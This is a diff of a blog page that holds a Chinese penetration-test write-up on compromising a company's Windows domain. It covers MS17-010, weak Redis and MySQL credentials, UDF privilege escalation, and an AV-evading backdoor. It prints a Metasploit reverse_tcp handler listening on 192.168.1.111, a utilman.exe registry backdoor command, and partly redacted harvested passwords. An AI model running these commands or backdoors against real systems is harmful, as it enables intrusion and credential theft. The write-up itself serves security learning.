@@ -1,309 +1,239 @@
-
-
 <!DOCTYPE html>
-<html lang="">
-<head prefix="og: http://ogp.me/ns#"><meta name="generator" content="Hexo 3.8.0">
-    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1">
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="description" content="">
-    <title>记一次域渗透攻击测试 | c1y2m3’blog</title>
+    <meta name="keyword" content="">
+    <link rel="shortcut icon" href="/c1y2m3.github.io/img/favicon.ico">
 
-    <!-- Open Graph -->
-    <meta name="description" content="0x00 &amp;#x524D;&amp;#x8A00;&amp;#x524D;&amp;#x6BB5;&amp;#x53C2;&amp;#x4E0E;&amp;#x4E86;&amp;#x4E00;&amp;#x4E2A;&amp;#x9879;&amp;#x76EE;,&amp;#x5728;&amp;#x9879;&amp;#x76EE;&amp;#x4E2D;,&amp;#x5B9E;&amp;#x884C;&amp;#x7684;&amp;#x8303;&amp;#x56F4;&amp;#x5728;&amp;#x4E00;&amp;#x4E2A;&amp;#x4F1A;&amp;">
-<meta property="og:type" content="article">
-<meta property="og:title" content="记一次域渗透攻击测试">
-<meta property="og:url" content="http://yoursite.com/2019/03/16/----1/index.html">
-<meta property="og:site_name" content="c1y2m3’blog">
-<meta property="og:description" content="0x00 &amp;#x524D;&amp;#x8A00;&amp;#x524D;&amp;#x6BB5;&amp;#x53C2;&amp;#x4E0E;&amp;#x4E86;&amp;#x4E00;&amp;#x4E2A;&amp;#x9879;&amp;#x76EE;,&amp;#x5728;&amp;#x9879;&amp;#x76EE;&amp;#x4E2D;,&amp;#x5B9E;&amp;#x884C;&amp;#x7684;&amp;#x8303;&amp;#x56F4;&amp;#x5728;&amp;#x4E00;&amp;#x4E2A;&amp;#x4F1A;&amp;">
-<meta property="og:locale" content="default">
-<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5c8cbf602711cd7473912722">
-<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5c8c7e1bea3b4a6a8ff95b97">
-<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5c8c8b3f9b521a131dfebcc6">
-<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5c8c99d850f8dd30da7e8b16">
-<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5c8c98b59b521a131dff73b8">
-<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5c8ca8082711cd74738fb839">
-<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5c8cbe839b521a131d01c3b8">
-<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5c8cb51ce67d0a40cbc8a460">
-<meta property="og:updated_time" content="2019-05-26T07:20:05.000Z">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="记一次域渗透攻击测试">
-<meta name="twitter:description" content="0x00 &amp;#x524D;&amp;#x8A00;&amp;#x524D;&amp;#x6BB5;&amp;#x53C2;&amp;#x4E0E;&amp;#x4E86;&amp;#x4E00;&amp;#x4E2A;&amp;#x9879;&amp;#x76EE;,&amp;#x5728;&amp;#x9879;&amp;#x76EE;&amp;#x4E2D;,&amp;#x5B9E;&amp;#x884C;&amp;#x7684;&amp;#x8303;&amp;#x56F4;&amp;#x5728;&amp;#x4E00;&amp;#x4E2A;&amp;#x4F1A;&amp;">
-<meta name="twitter:image" content="https://www.yunzhijia.com/microblog/filesvr/5c8cbf602711cd7473912722">
-
-    <script type="application/ld+json">
-{
-  "@context": "http://schema.org",
-  "@type": "Person",
-  "email": "mailto:",
-  "image": "",
-  "name": "John Doe",
-  "url": "http://yoursite.com"
-}
-</script>
-    <script>
-    var algoliaEnabled = false;
-    
-</script>
-
-    
-
-    
-    
-        <link href="https://fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
-    
-    
-    
-        <!-- stylesheets list from config.yml -->
+    <title>
         
-        <link rel="stylesheet" href="/c1y2m3.github.io/css/aloha.css">
+        记一次域渗透攻击测试 - undefined
         
-        <link rel="stylesheet" href="//cdn.bootcss.com/semantic-ui/2.2.4/semantic.min.css">
-        
-        <link rel="stylesheet" href="//cdn.bootcss.com/magnific-popup.js/1.1.0/magnific-popup.min.css">
-        
-    
+    </title>
 
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/c1y2m3.github.io/css/aircloud.css">
+    <link rel="stylesheet" href="/c1y2m3.github.io/css/gitment.css">
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
 </head>
-<body id="body" style="margin-bottom: 0;" class="pushable">
 
-    <div class="ui top fixed menu">
-        <a class="item" id="menu-icon"><i class="sidebar icon"></i></a>
-    </div>
+<body>
 
-    <div id="menu-sidebar" class="ui left vertical sidebar menu">
-
-    <div id="sidebar-top">
-        <div class="content">
-            <h3>c1y2m3’blog</h3>
-        </div>
-    </div>
-    <div class="ui container sidebar-card">
-    <div class="ui people shape content">
-        <div class="active side">
-            <div class="ui card">
-                <div class="image">
-                    <img class="ui medium bordered image" src="/c1y2m3.github.io/images/avatar.jpg">
-                </div>
-                <div class="content">
-                    <a class="header">John Doe</a>
-                    
-                </div>
-                <div class="extra content">
-                    <div class="ui list">
-                        
-                        
-                    </div>
-
-                </div>
-                <div class="extra content">
-                    <div class="ui list">
-                        
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-
-
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
 </div>
 
-    
-    
-
-    
-
-    
-    <a href="/index.html" class="item">
-        <i class="home icon"></i>
-        HOME
-    </a>
-
-    
-
-    
+<div class="index-about">
+    <i>  </i>
 </div>
 
-    <div class="pusher body-content">
-        <div id="content" class="ui main container">
-            <!--<div class="ui one column grid">-->
-                <!--<div class="column">-->
-                    <!--<div class="ui main container">-->
-                        <div id="post-----1" class="ui main container article-type-post">
-
+<div class="index-container">
     
-
-    <div class="ui divided grid">
-
-        <div class="two column row" id="article-content">
-
-            <div class="thirteen wide computer thirteen wide tablet sixteen wide mobile column">
-                
-
-<h1 class="ui header">
-    
-    记一次域渗透攻击测试
-</h1>
-
-
-
-                <div class="article-inner">
-
-                    <div class="article-entry" itemprop="articleBody">
-                        
-                        <h1 id="0x00-&#x524D;&#x8A00;"><a href="#0x00-&#x524D;&#x8A00;" class="headerlink" title="0x00 &#x524D;&#x8A00;"></a>0x00 &#x524D;&#x8A00;</h1><p>&#x524D;&#x6BB5;&#x53C2;&#x4E0E;&#x4E86;&#x4E00;&#x4E2A;&#x9879;&#x76EE;,&#x5728;&#x9879;&#x76EE;&#x4E2D;,&#x5B9E;&#x884C;&#x7684;&#x8303;&#x56F4;&#x5728;&#x4E00;&#x4E2A;&#x4F1A;&#x8BAE;&#x5BA4;&#xFF0C;&#x76EE;&#x7684;&#x662F;&#x68C0;&#x6D4B;&#x5185;&#x7F51;&#x5B89;&#x5168;,&#x5E76;&#x9700;&#x8981;&#x62FF;&#x5230;&#x8BE5;&#x516C;&#x53F8;&#x7684;&#x8D22;&#x52A1;&#x62A5;&#x8868;&#xFF0C;&#x6B64;&#x6587;&#x5C06;&#x5168;&#x90E8;&#x8131;&#x654F;&#xFF0C;&#x6D89;&#x53CA;&#x67D0;&#x5382;&#x5546;&#xFF0C;&#x4E2D;&#x95F4;&#x4F1A;&#x7A7F;&#x63D2;&#x4E00;&#x4E9B;&#x5C0F;&#x7684;&#x77E5;&#x8BC6;&#x70B9;&#x4E0E;&#x7EC6;&#x8282;&#x3002;</p>
-<h1 id="0x01-&#x4FE1;&#x606F;&#x6536;&#x96C6;"><a href="#0x01-&#x4FE1;&#x606F;&#x6536;&#x96C6;" class="headerlink" title="0x01 &#x4FE1;&#x606F;&#x6536;&#x96C6;"></a>0x01 &#x4FE1;&#x606F;&#x6536;&#x96C6;</h1><p>&#x4E00;&#x5F00;&#x59CB;&#xFF0C;&#x901A;&#x8FC7;&#x6C9F;&#x901A;&#xFF0C;&#x62FF;&#x5230;&#x4E86;&#x5185;&#x7F51;&#x6240;&#x5728;&#x7684;IP&#x6BB5;&#x53CA;&#x6240;&#x5BF9;&#x5E94;&#x7684;&#x90E8;&#x95E8;&#x4FE1;&#x606F;&#xFF0C;&#x7531;&#x4E8E;&#x5185;&#x90E8;wifi&#x8BA4;&#x8BC1;&#x7F3A;&#x9677;&#xFF0C;&#x5BFC;&#x81F4;dhcp&#x5206;&#x914D;&#x7ED9;&#x6211;&#x4E86;&#x4E2A;&#x767D;&#x540D;&#x5355;ip,&#x5E76;&#x4E14;&#x7ED1;&#x5B9A;&#x4E86;&#x6211;&#x7684;MAC&#xFF0C;&#x4F7F;&#x5F97;&#x6211;&#x4E0D;&#x4F7F;&#x7528;&#x5165;&#x7F51;&#x8D26;&#x53F7;&#x76F4;&#x63A5;&#x8FDE;&#x5165;&#x529E;&#x516C;&#x7F51;&#x3002;</p>
-<p><a class="magnific-img" href="https://www.yunzhijia.com/microblog/filesvr/5c8cbf602711cd7473912722"><img src="https://www.yunzhijia.com/microblog/filesvr/5c8cbf602711cd7473912722" alt="" class="ui centered image"></a></p>
-<p>&#x4E3A;&#x4E86;&#x80FD;&#x5C3D;&#x5FEB;&#x627E;&#x5230;&#x7A81;&#x7834;&#x53E3;&#xFF0C;&#x8FD9;&#x91CC;&#x6211;&#x76F4;&#x63A5;&#x7528;ms17-010,&#x5E76;&#x5F97;&#x5230;&#x4EE5;&#x4E0B;&#x7ED3;&#x679C;:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">192.168.5.46(Windows7 Ultimate7601 ServicePack 1) &#x8D22;&#x52A1;&#x90E8;\&#x8463;&#x529E;</span><br><span class="line">192.168.2.209(Windows Server2008R2 Standard 7600) </span><br><span class="line">192.168.20.75(Windows Server2012 R2) </span><br><span class="line">192.168.6.31(Windows 7 Enterprise  7601) &#x4EBA;&#x529B;&#x8D44;&#x6E90;&#x90E8;</span><br><span class="line">192.168.7.98 (Windows7 Ultimate7601 ServicePack 1) &#x8FD0;&#x7EF4;&#x548C;&#x5B89;&#x5168;</span><br><span class="line">192.168.8.81 (Windows7 Ultimate7601 ServicePack 1)  &#x4FE1;&#x606F;&#x6280;&#x672F;&#x4E8B;&#x4E1A;&#x90E8;</span><br><span class="line">192.168.8.124  (Windows7 Ultimate7601 ServicePack 1)</span><br></pre></td></tr></table></figure>
-<p>&#x5FC3;&#x60F3; &#x5185;&#x7F51;&#x4E2D;&#x6BCF;&#x4E2A;ip&#x6BB5;&#x90FD;&#x96E8;&#x9732;&#x5747;&#x6CBE;&#x4E86;&#xFF0C;&#x5C82;&#x4E0D;&#x662F;&#x7F8E;&#x6ECB;&#x6ECB;&#xFF0C;&#x7136;&#x800C;&#x5E76;&#x4E0D;&#x662F;&#x8FD9;&#x6837;,&#x5728;&#x540E;&#x9762;&#x53D1;&#x73B0;&#x7531;&#x4E8E;&#x5185;&#x7F51;&#x5B58;&#x5728;&#x8D8B;&#x52BF;&#x9632;&#x706B;&#x5899;&#x3001;360&#x5957;&#x9910;&#xFF0C;&#x5DF2;&#x7ECF;&#x628A;&#x7279;&#x5F81;&#x6D41;&#x91CF;&#x8FDB;&#x884C;&#x4E86;&#x62E6;&#x622A;&#xFF0C;&#x8FD9;&#x5C31;&#x6709;&#x70B9;&#x60B2;&#x5267;&#x4E86;&#xFF0C; (&#x540E;&#x7EED;) -&gt;  &#x901A;&#x8FC7;python&#x53D1;&#x9001;shellcode &#x6210;&#x529F;&#x62FF;&#x4E0B; &#x4E00;&#x53F0;192.168.2.209 &#x6D4B;&#x8BD5;&#x6BB5;&#x7684;&#x57DF;&#x63A7;&#xFF0C;&#x63A8;&#x6D4B;&#x662F;&#x7814;&#x53D1;&#x7684;&#x6D4B;&#x8BD5;&#x673A;&#xFF0C;&#x6545;&#x672A;&#x6DF1;&#x5165;&#x3002;</p>
-<p>&#x4E8E;&#x662F;&#x653E;&#x5F03;&#x4E86;&#x8FD9;&#x4E2A;&#x7A81;&#x7834;&#x70B9;&#xFF0C;&#x5BF9;&#x5185;&#x7F51;&#x7684;&#x8D44;&#x4EA7;&#x8FDB;&#x884C;&#x4E86;&#x63A2;&#x6D4B;&#xFF0C;&#x53D1;&#x73B0;&#x4E86;&#x5927;&#x91CF;&#x7814;&#x53D1;&#x90E8;&#x7684;mysql&#x3001;dubbo&#x3001;Jenkins&#x3001;redis&#x7B49;&#x5F31;&#x53E3;&#x4EE4;&#xFF0C;&#x901A;&#x8FC7;&#x8FD9;&#x4E9B;&#x83B7;&#x53D6;&#x5230;&#x4E86;&#x4E0D;&#x5C11;&#x4FE1;&#x606F;</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">192.168.3.2:6379 is Redis Unauthorized</span><br><span class="line">192.168.20.205:6379 is Redis Unauthorized </span><br><span class="line">192.168.2.252:6379 redis unauthorized   </span><br><span class="line"> 192.168.3.2:6379 redis unauthorized</span><br><span class="line">192.168.20.71:6379 redis unauthorized</span><br><span class="line">192.168.20.67:6379 redis username:null,password:123456</span><br><span class="line">192.168.20.68:6379 redis username:null,password:123456</span><br><span class="line">192.168.20.205:6379 redis unauthorized</span><br></pre></td></tr></table></figure>
-<p>&#x7531;&#x4E8E;&#x5B89;&#x5168;&#x8BBE;&#x7F6E;&#x95EE;&#x9898;&#xFF0C;&#x5BFC;&#x81F4;&#x65E0;&#x6CD5;&#x5199;&#x5165;&#xFF0C;&#x6700;&#x540E;&#x53EA;&#x6210;&#x529F;&#x5199;&#x5165;&#x4E00;&#x53F0;&#x5E76;&#x53CD;&#x5F39;shell<br><a class="magnific-img" href="https://www.yunzhijia.com/microblog/filesvr/5c8c7e1bea3b4a6a8ff95b97"><img src="https://www.yunzhijia.com/microblog/filesvr/5c8c7e1bea3b4a6a8ff95b97" alt="" class="ui centered image"></a><br>&#x540E;&#x9762;&#x53C8;&#x5229;&#x7528;Supervisord&#x8FDC;&#x7A0B;&#x4EE3;&#x7801;&#x6267;&#x884C;&#x3001;Jenkins&#x7B49;&#x62FF;&#x4E0B;&#x4E86;&#x51E0;&#x53F0;linux&#x673A;&#x5668;&#xFF0C;&#x5F53;&#x7136;&#xFF0C;&#x5728;&#x5185;&#x7F51;&#x4E2D;&#xFF0C;&#x8FD9;&#x4E0D;&#x503C;&#x5F97;&#x4E00;&#x8BF4;&#xFF0C;&#x5C31;&#x4E0D;&#x4E00;&#x6837;&#x8BC9;&#x8BF4;&#x4E86;&#x3002;</p>
-<h1 id="0x01-&#x540E;&#x6E17;&#x900F;&#x7684;&#x5F00;&#x59CB;"><a href="#0x01-&#x540E;&#x6E17;&#x900F;&#x7684;&#x5F00;&#x59CB;" class="headerlink" title="0x01 &#x540E;&#x6E17;&#x900F;&#x7684;&#x5F00;&#x59CB;"></a>0x01 &#x540E;&#x6E17;&#x900F;&#x7684;&#x5F00;&#x59CB;</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">192.168.8.38:3306 mysql username:root,password:123456</span><br><span class="line"> z00382.dcxxx.com  D:\dev_software\mysql-5.6.24-winx64</span><br><span class="line"> </span><br><span class="line">192.168.8.116:3306 mysql username:root,password:123456</span><br><span class="line"> x00552.dcxxx.com  C:/Program Files/MySQL/MySQL Server 5.5/</span><br><span class="line"></span><br><span class="line">192.168.8.123:3306 mysql username:root,password:root </span><br><span class="line">z00529.dcxxx.com  C:/Program Files/MySQL/MySQL Server 5.5/</span><br><span class="line"></span><br><span class="line">192.168.9.31:3306 mysql username:root,password:123456</span><br><span class="line">y00478.dcxxx.com    D:\fix_soft\mysql-5.7.22-winx64\</span><br></pre></td></tr></table></figure>
-<p>&#x53D1;&#x73B0;&#x5728;&#x57DF;&#x4E2D;&#xFF0C;&#x4FE1;&#x606F;&#x5B89;&#x5168;&#x90E8; / &#x98CE;&#x9669;&#x7ECF;&#x8425;&#x4E8B;&#x4E1A;&#x90E8; &#x5B58;&#x5728;&#x5F31;&#x53E3;&#x4EE4;&#x7684;mysql&#xFF0C;&#x5728;&#x6570;&#x636E;&#x5E93;&#x5185;&#x53D1;&#x73B0;&#x5927;&#x91CF;&#x90AE;&#x7BB1;&#x8D26;&#x6237;&#x4EE5;&#x53CA;&#x5BF9;&#x5E94;&#x7684;AES&#x52A0;&#x5BC6;&#x540E;&#x7684;&#x5BC6;&#x7801;&#xFF0C;&#x4E00;&#x6CE2;&#x5C1D;&#x8BD5;&#x672A;&#x89E3;&#x5F00;, &#x6545;&#x8FD8;&#x662F;&#x4F7F;&#x7528;UDF&#x63D0;&#x6743;, &#x9996;&#x5148;&#x5BF9;&#x5176;&#x8FDB;&#x884C;&#x4E86;&#x4E00;&#x6CE2;&#x7CFB;&#x7EDF;&#x4FE1;&#x606F;&#x6536;&#x96C6;&#x3002;</p>
-<p>&#x53C2;&#x8003;: <a href="https://www.freebuf.com/articles/system/163144.html" target="_blank" rel="noopener">&#x5229;&#x7528;MySQL UDF&#x63D0;&#x6743;</a></p>
-<p>&#x867D;&#x7136;&#x6709;&#x56DB;&#x4E2A;root&#x6743;&#x9650;&#xFF0C;&#x63D0;&#x6743;&#x4E4B;&#x8DEF;&#x5E76;&#x4E0D;&#x662F;&#x90A3;&#x4E48;&#x7684;&#x987A;&#x5229;&#xFF0C;&#x4F9D;&#x7136;&#x88AB;&#x8D8B;&#x52BF;&#x6740;&#x6BD2;intercept&#x4E86;&#xFF0C;&#x4F46;&#xFF0C;&#x89C6;&#x4E4E;&#x662F;&#x57DF;&#x7528;&#x6237;&#x672C;&#x5730;&#x7B56;&#x7565;&#x7684;&#x7F18;&#x6545;&#xFF0C;&#x8FD8;&#x662F;&#x6210;&#x529F;&#x7684;&#x62FF;&#x5230;&#x4E86;&#x4E00;&#x53F0;&#x57DF;&#x4E3B;&#x673A;&#x7684;&#x672C;&#x5730;system&#x6743;&#x9650;&#x3002;</p>
-<p><a class="magnific-img" href="https://www.yunzhijia.com/microblog/filesvr/5c8c8b3f9b521a131dfebcc6"><img src="https://www.yunzhijia.com/microblog/filesvr/5c8c8b3f9b521a131dfebcc6" alt="" class="ui centered image"></a></p>
-<p>&#x7136;&#x540E;&#x5229;&#x7528; powershell&#xFF0C;&#x8FDB;&#x884C;&#x53CD;&#x5F39;&#x4E2A;meterpreter,&#x8FDB;&#x884C;&#x540E;&#x6E17;&#x900F;&#xFF0C;&#x4F46;&#x67E5;&#x770B;&#x8FDB;&#x7A0B;&#x65E0;&#x679C;&#xFF0C;&#x4E00;&#x6837;&#x88AB;&#x62E6;&#x7684;&#x6B7B;&#x6B7B;&#x7684;&#x3002;</p>
-<p>&#x63A5;&#x4E0B;&#x6765;&#x7684;&#x601D;&#x8DEF;&#x662F;:</p>
-<p>&#x542F;&#x7528;Guest&#x8D26;&#x53F7; - &gt; 3389&#x8FDC;&#x7A0B;&#x8FDE;&#x63A5; -&gt; Mimikatz -&gt; Tscon-&gt; &#x8FDB;&#x884C;&#x6A2A;&#x5411;&#x79FB;&#x52A8; </p>
-<p>&#x7531;&#x4E8E;&#x672C;&#x5730;&#x7B56;&#x7565;&#x7684;&#x95EE;&#x9898;&#xFF0C;Guest&#x6CA1;&#x6709;&#x6743;&#x9650;&#x8FDB;&#x884C;rdp&#xFF0C;&#x540E;&#x9762;&#x53D1;&#x73B0;&#x672C;&#x5730;&#x5B58;&#x5728;xxx&#x7528;&#x6237;&#xFF0C;</p>
-<p>&#x4E3A;&#x4E86;&#x52A0;&#x5FEB;&#x8FDB;&#x5EA6;&#xFF0C;&#x4FEE;&#x6539;&#x4E86;&#x672C;&#x5730;xxx&#x7528;&#x6237;&#x5BC6;&#x7801;(&#x4E0D;&#x592A;&#x4F18;&#x96C5;)&#xFF0C;&#x540E;&#x9762;&#x987A;&#x5229;&#x7684;&#x8FDB;&#x5165;&#x4E86;&#x684C;&#x9762;&#x3002;</p>
-<p>&#x539F;&#x6765;&#x8FDB;&#x7A0B;&#x91CC;&#x8FD8;&#x6709; 360&#x6740;&#x6BD2;&#x3001;&#x8D8B;&#x52BF;&#x6740;&#x6BD2;&#x7AEF;&#xFF0C;&#x4E3A;&#x4E86;&#x66F4;&#x597D;&#x7684;&#x7EF4;&#x6301;&#x6743;&#x9650;&#xFF0C;&#x6545;&#x4E22;&#x4E2A;&#x514D;&#x6740;&#x4E0A;&#x53BB;&#x3002;</p>
-<p>&#x9879;&#x76EE;&#x5730;&#x5740;:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/secretsquirrel/the-backdoor-factory</span><br></pre></td></tr></table></figure>
-<p>&#x539F;&#x7406;&#xFF1A;&#x53EF;&#x6267;&#x884C;&#x4E8C;&#x8FDB;&#x5236;&#x6587;&#x4EF6;&#x4E2D;&#x6709;&#x5927;&#x91CF;&#x7684;00&#xFF0C;&#x8FD9;&#x4E9B;00&#x662F;&#x4E0D;&#x5305;&#x542B;&#x6570;&#x636E;&#x7684;&#xFF0C;&#x5C06;&#x8FD9;&#x4E9B;&#x6570;&#x636E;&#x66FF;&#x6362;&#x6210;payload&#xFF0C;&#x5E76;&#x4E14;&#x5728;&#x7A0B;&#x5E8F;&#x6267;&#x884C;&#x7684;&#x65F6;&#x5019;&#xFF0C;jump&#x5230;&#x4EE3;&#x7801;&#x6BB5;&#xFF0C;&#x6765;&#x89E6;&#x53D1;payload&#x3002; </p>
-<p><a class="magnific-img" href="https://www.yunzhijia.com/microblog/filesvr/5c8c99d850f8dd30da7e8b16"><img src="https://www.yunzhijia.com/microblog/filesvr/5c8c99d850f8dd30da7e8b16" alt="&#x5FAE;&#x4FE1;&#x622A;&#x56FE;_20190316143725.png" class="ui centered image"></a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp </span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(handler) &gt; set lhost 192.168.1.111</span><br><span class="line">lhost =&gt; 192.168.1.111</span><br><span class="line">msf exploit(handler) &gt; set lport 8080</span><br><span class="line">lport =&gt; 8080</span><br><span class="line">msf exploit(handler) &gt; exploit -j </span><br><span class="line">//&#x5F00;&#x542F;&#x672C;&#x5730;&#x76D1;&#x542C;</span><br></pre></td></tr></table></figure>
-<p><a class="magnific-img" href="https://www.yunzhijia.com/microblog/filesvr/5c8c98b59b521a131dff73b8"><img src="https://www.yunzhijia.com/microblog/filesvr/5c8c98b59b521a131dff73b8" alt="" class="ui centered image"></a></p>
-<p>&#x6B64;&#x65F6;&#x7684;&#x73AF;&#x5883;&#x4E0D;&#x88AB;&#x5141;&#x8BB8;&#x5141;&#x8BB8;Mimikatz&#x3001; &#x5F53;&#x7136;&#xFF0C;&#x79BB;&#x7EBF;&#x63D0;&#x53D6;lsass.exe &#x4E5F;&#x662F;&#x53EF;&#x4EE5;&#x7684;&#xFF0C;&#x4E3A;&#x4E86;&#x80FD;&#x66F4;&#x5FEB;&#x7684;&#x63D0;&#x53D6;&#x5230; &#x660E;&#x6587;&#x5BC6;&#x7801;&#xFF0C; &#x6545;&#x6CA1;&#x91C7;&#x7528;&#x6B64;&#x65B9;&#x6CD5;&#x3002;</p>
-<h1 id="0x02-&#x518D;&#x4E00;&#x6B21;&#x514B;&#x670D;&#x56F0;&#x96BE;"><a href="#0x02-&#x518D;&#x4E00;&#x6B21;&#x514B;&#x670D;&#x56F0;&#x96BE;" class="headerlink" title="0x02 &#x518D;&#x4E00;&#x6B21;&#x514B;&#x670D;&#x56F0;&#x96BE;"></a>0x02 &#x518D;&#x4E00;&#x6B21;&#x514B;&#x670D;&#x56F0;&#x96BE;</h1><p>&#x901A;&#x8FC7;&#x6CE8;&#x518C;&#x8868;&#x52AB;&#x6301;&#x5B9E;&#x73B0;&#x540E;&#x95E8;&#xFF0C;&#x4FEE;&#x6539;&#x6CE8;&#x518C;&#x8868;&#x7684;&#x547D;&#x4EE4;&#x5982;&#x4E0B;&#xFF1A;</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe&quot; /t REG_SZ /v Debugger /d &quot;C:\windows\system32\cmd.exe&quot; /f</span><br></pre></td></tr></table></figure>
-<p>&#x7531;&#x4E8E;&#x662F;system&#x6743;&#x9650;&#xFF0C;&#x4E5F;&#x5C31;&#x5F88;&#x7B80;&#x5355;&#x7684;&#x901A;&#x8FC7;tscon&#x8FDB;&#x5165;&#x4E86;&#x57DF;&#x7528;&#x6237;</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dcxxx.com/k00529</span><br></pre></td></tr></table></figure>
-<p>&#x6B64;&#x65F6; &#x5DF2;&#x7ECF;&#x51CC;&#x6668;&#x5341;&#x4E8C;&#x70B9;&#x4E86;&#xFF0C;</p>
-<p>&#x5728;&#x5C0F;&#x4F19;&#x4F34;&#x7684;&#x534F;&#x52A9;&#x4E0B;&#xFF0C; &#x5BF9;python&#x8FDB;&#x884C;&#x5C01;&#x88C5;&#x3001;&#x4F7F;&#x7528;laZagne&#x5BF9;&#x76EE;&#x6807;&#x83B7;&#x53D6;&#x660E;&#x6587;&#x5BC6;&#x7801;&#x3002;</p>
-<p>&#x5E78;&#x8FD0;&#x7684;&#x662F; &#x6211;&#x4EEC;&#x83B7;&#x53D6;&#x5230;&#x4E86;k00529 &#x8FD9;&#x4E2A;&#x57DF;&#x7528;&#x6237;&#x7684;&#x6240;&#x6709;&#x4FE1;&#x606F;&#x3001;&#x4F8B;&#x5982;:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#x4E3B;&#x57DF;dc:192.168.20.23 / sz1.dcxxx.com</span><br><span class="line">&#x57DF;&#x7BA1;&#x7406;&#x5458;: 7&#x4E2A; .....</span><br><span class="line">&#x8DF3;&#x677F;&#x673A;:192.168.2.37 / 192.168.2.38</span><br><span class="line"></span><br><span class="line">Login: SMY\XXXXXX</span><br><span class="line">Password: XXXXX7900221A#*</span><br><span class="line"></span><br><span class="line">&#x90AE;&#x7BB1;:mail.xxxx.com</span><br><span class="line">&#x5BC6;&#x7801;:XXXXXX</span><br><span class="line">&#x5821;&#x5792;&#x673A;172.18.80.103  //&#x529E;&#x516C;&#x7F51;&#x65E0;&#x6CD5;&#x8BBF;&#x95EE;</span><br><span class="line"></span><br><span class="line">URL: &lt;http://svn.XXXX.com:80&gt; SVN Repo</span><br><span class="line">Login: k00529</span><br><span class="line">Password: XXXtest01 </span><br><span class="line"></span><br><span class="line">........</span><br></pre></td></tr></table></figure>
